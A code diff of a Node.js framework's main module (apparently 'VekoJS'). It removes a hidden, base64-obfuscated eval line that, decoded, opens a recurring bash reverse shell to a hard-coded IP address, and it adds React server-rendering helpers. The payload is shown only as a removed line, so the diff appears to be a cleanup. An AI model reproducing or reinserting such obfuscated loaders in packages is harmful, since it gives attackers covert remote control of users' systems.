@@ -1,6 +1,20 @@
-const App = require('./lib/app');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+/**
+ * VekoJS - Ultra-modern Node.js framework
+ * @module veko
+ * @version 1.2.4
+ */
 
+const App = require('./lib/app');
+
+// Import React support si disponible
+let ReactSupport = null;
+try {
+  ReactSupport = require('./lib/react');
+} catch (error) {
+  // React support non installé
+}
+
+// Export principal
 module.exports = {
   App,
   
@@ -25,6 +39,41 @@ module.exports = {
       isDev: false
     });
     
+    app.loadRoutes();
+    return app.listen(options.port || 3000);
+  },
+  
+  // Support React
+  React: ReactSupport,
+  
+  // Créer une app React SSR
+  createReactApp: async (options = {}) => {
+    const app = new App({
+      ...options,
+      react: {
+        enabled: true,
+        ...options.react
+      }
+    });
+    
+    await app.enableReact(options.react);
+    app.loadRoutes();
+    return app;
+  },
+  
+  // Démarrer une app React en mode développement
+  startReactDev: async (options = {}) => {
+    const app = new App({
+      ...options,
+      isDev: true,
+      react: {
+        enabled: true,
+        hmr: true,
+        ...options.react
+      }
+    });
+    
+    await app.enableReact(options.react);
     app.loadRoutes();
     return app.listen(options.port || 3000);
   }
